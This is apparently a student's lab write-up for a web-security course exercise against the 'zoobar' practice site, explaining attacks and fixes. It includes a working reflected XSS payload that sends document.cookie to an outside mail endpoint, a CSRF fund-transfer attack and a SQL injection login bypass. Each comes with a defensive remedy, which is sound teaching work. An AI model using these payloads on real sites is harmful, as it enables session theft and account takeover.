@@ -1,0 +1,46 @@
+Part A Explanation:
+    When someone searches for a user the url takes the form http://zoobar.org/users.php?user=user_to_search.
+    The user query parameter is reinjected into the html input when the page reloads allowing us to insert
+    custom html. 
+    1. The first bit of our input is " size=10>. This closes the user input Html element allowing
+    us to create a new Html element.
+    2. <script>s=window.document.styleSheets[0];s.insertRule("span,.warning{display:none}",s.cssRules.length);
+    This starts a javascript html element which hides the red warning text as well as other text leakage
+    caused by our injected html breaking the page.
+    3. new Image().src%3d"http%3a%2f%2fzoomail.org%2fsendmail.php%3fnetid%3darbeers%26payload%3d"%2bdocument.cookie%2b"%26random%3d"%2bMath.random()</script>
+    This is the email script with the reserved URL characters encoded so that it does not break the ability for the user page to load.
+    4. <input hidden+
+    When we closed the input element in step one there was some trailing leakage from the element that is now rendered as text.
+    We can hide it by opening a new input element with the hidden attribute.
+
+Part A Fix:
+    One solution would be to sanitize all input so that it is rendered as a string and not HTML code.
+    We could also scan for and remove special html characters such as ",<,>, etc.
+    It seems that PHP provides functionality for this with the htmlspecialchars function that replaces
+    special html characters with their html encoding. There is also the striptags function allowing
+    the replacement of html tags such as <script> with something else instead.
+
+
+Part B Explanation:
+    The zoobar service can recieve requests even if they do not originate from the zoobar client website.
+    Therefore, a malicious website can also submit requests to zoobar, and if the victim who visits the 
+    malicious website is also logged into the zoobar website then the browser will also send their 
+    authentication cookie allowing the malicious user to do anything the authenticated user could do. 
+    In b.html, an invisible form is submitted with the fields filled out to transfer 10 zoobars to the attacker.
+
+Part B Fix:
+    The zoobar website could use a csrf token to help fix the issue. Each time a user visits the website
+    they are given a random token that they must also submit along with the form. This means the attacker
+    must guess the long and randomly generated token which would be near impossible.
+
+Part C Explanation:
+    The zoobar website is vulnerable to sql injection when logging in. This is because the login sql query
+    puts the username input directly into the query. Therefore, we can input the following as our username:
+    <username>'-- where the 2 dashes ignore the password requirement for the given user. One problem is that the
+    login function escapes the username when getting the salt, however, this can be bypassed by registering a user
+    with our malicious username.  
+
+Part C Fix:
+    When checking to see if the passwords match the username should have also been escaped the same way it was
+    to get the user's salt. Additionaly the username should have been inserted as a parameter into the sql 
+    query function instead of being embedded directly into the query string.
